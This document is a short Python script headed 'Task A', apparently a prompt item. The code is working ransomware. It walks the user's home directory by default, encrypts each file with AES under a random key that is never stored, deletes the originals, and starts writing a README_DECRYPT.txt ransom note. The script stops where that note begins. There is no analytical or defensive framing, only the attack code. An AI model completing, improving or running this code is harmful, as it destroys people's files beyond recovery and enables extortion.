Task A: import os, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64, random, string

def generate_key():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=32))

def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        cipher = AES.new(key.encode(), AES.MODE_ECB)
        encrypted = cipher.encrypt(pad(data, AES.block_size))
        with open(file_path + '.cross_encrypted', 'wb') as f:
            f.write(encrypted)
        os.remove(file_path)
        print(f"Locked: {file_path}")
    except Exception as e:
        pass

def walk_and_encrypt(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if not file.endswith('.cross_encrypted'):
                file_path = os.path.join(root, file)
                encrypt_file(file_path, key)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        target = os.path.expanduser("~")
    else:
        target = sys.argv[1]

    key = generate_key()
    walk_and_encrypt(target, key)

    with open(os.path.join(target, "README_DECRYPT.txt"), "w", encoding="utf-8") as f:
